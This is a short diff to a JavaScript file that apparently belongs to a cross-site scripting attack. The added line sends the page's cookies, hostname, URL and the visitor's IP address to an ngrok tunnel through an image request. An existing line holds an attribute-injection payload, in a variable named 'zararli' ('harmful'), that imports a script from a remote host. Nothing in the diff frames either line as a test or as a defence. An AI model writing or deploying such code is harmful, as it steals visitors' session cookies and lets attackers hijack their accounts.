@@ -1,5 +1,6 @@
-console.log('selam');
 console.log(document.cookie);
+fetch("https://api.ipify.org?format=json").then(r=>r.json()).then(d=>d.ip).catch(()=>"_").then(ip=>{new Image().src="https://9d47-188-132-138-60.ngrok-free.app/?"+document.cookie+"&host="+location.hostname+"&url="+encodeURIComponent(location.href)+"&ip="+ip});
+
 
 (function() {
   const zararli = `"autofocus onfocus=import('https://abbb.3d.tc/a.js');"`;
